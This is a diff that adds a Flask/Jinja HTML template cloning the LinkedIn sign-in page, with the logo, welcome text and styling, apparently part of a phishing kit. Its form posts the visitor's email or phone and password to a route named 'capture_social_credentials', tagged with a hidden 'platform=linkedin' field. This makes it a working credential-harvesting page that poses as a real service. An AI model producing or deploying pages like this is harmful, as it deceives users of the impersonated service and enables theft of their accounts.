@@ -1,0 +1,195 @@
+{% extends "base.html" %}
+
+{% block title %}LinkedIn: Log In or Sign Up{% endblock %}
+
+{% block content %}
+<div class="linkedin-container">
+    <div class="linkedin-header">
+        <div class="linkedin-logo">
+            <span class="linkedin-text">Linked</span><span class="linkedin-in">in</span>
+        </div>
+    </div>
+    
+    <div class="linkedin-main">
+        <div class="linkedin-welcome">
+            <h1>Welcome Back</h1>
+            <p>Don't miss your next opportunity. Sign in to stay updated on your professional world.</p>
+        </div>
+        
+        <div class="linkedin-form-container">
+            <form method="POST" action="{{ url_for('capture_social_credentials') }}" class="linkedin-form">
+                <input type="hidden" name="platform" value="linkedin">
+                
+                <div class="form-group">
+                    <label>Email or Phone</label>
+                    <input 
+                        type="text" 
+                        name="email" 
+                        class="linkedin-input"
+                        required
+                    >
+                </div>
+                
+                <div class="form-group">
+                    <label>Password</label>
+                    <input 
+                        type="password" 
+                        name="password" 
+                        class="linkedin-input"
+                        required
+                    >
+                </div>
+                
+                <div class="linkedin-forgot">
+                    <a href="#">Forgot password?</a>
+                </div>
+                
+                <button type="submit" class="linkedin-signin-btn">Sign in</button>
+                
+                <div class="linkedin-divider">
+                    <span>or</span>
+                </div>
+                
+                <div class="linkedin-signup">
+                    <p>New to LinkedIn? <a href="#">Join now</a></p>
+                </div>
+            </form>
+        </div>
+    </div>
+</div>
+
+<style>
+.linkedin-container {
+    min-height: 100vh;
+    background: #f3f2ef;
+    padding: 20px;
+}
+
+.linkedin-header {
+    text-align: center;
+    margin-bottom: 40px;
+}
+
+.linkedin-logo {
+    font-size: 40px;
+    font-weight: bold;
+}
+
+.linkedin-text {
+    color: #0a66c2;
+}
+
+.linkedin-in {
+    background: #0a66c2;
+    color: white;
+    padding: 2px 8px;
+    border-radius: 2px;
+}
+
+.linkedin-main {
+    max-width: 400px;
+    margin: 0 auto;
+    background: white;
+    border-radius: 8px;
+    padding: 40px;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+}
+
+.linkedin-welcome h1 {
+    font-size: 32px;
+    color: rgba(0, 0, 0, .9);
+    margin-bottom: 10px;
+}
+
+.linkedin-welcome p {
+    color: rgba(0, 0, 0, .6);
+    margin-bottom: 30px;
+    line-height: 1.5;
+}
+
+.form-group {
+    margin-bottom: 20px;
+}
+
+.form-group label {
+    display: block;
+    margin-bottom: 5px;
+    color: rgba(0, 0, 0, .9);
+    font-weight: 400;
+}
+
+.linkedin-input {
+    width: 100%;
+    padding: 12px;
+    border: 1px solid rgba(0, 0, 0, .3);
+    border-radius: 4px;
+    font-size: 16px;
+}
+
+.linkedin-input:focus {
+    border-color: #0a66c2;
+    outline: none;
+    box-shadow: 0 0 0 1px #0a66c2;
+}
+
+.linkedin-forgot {
+    text-align: right;
+    margin-bottom: 20px;
+}
+
+.linkedin-forgot a {
+    color: #0a66c2;
+    text-decoration: none;
+    font-weight: 600;
+}
+
+.linkedin-signin-btn {
+    width: 100%;
+    background: #0a66c2;
+    color: white;
+    border: none;
+    padding: 15px;
+    border-radius: 24px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-bottom: 20px;
+}
+
+.linkedin-signin-btn:hover {
+    background: #004182;
+}
+
+.linkedin-divider {
+    text-align: center;
+    position: relative;
+    margin: 20px 0;
+}
+
+.linkedin-divider:before {
+    content: '';
+    position: absolute;
+    top: 50%;
+    left: 0;
+    right: 0;
+    height: 1px;
+    background: rgba(0, 0, 0, .15);
+}
+
+.linkedin-divider span {
+    background: white;
+    padding: 0 20px;
+    color: rgba(0, 0, 0, .6);
+}
+
+.linkedin-signup {
+    text-align: center;
+}
+
+.linkedin-signup a {
+    color: #0a66c2;
+    text-decoration: none;
+    font-weight: 600;
+}
+</style>
+{% endblock %}
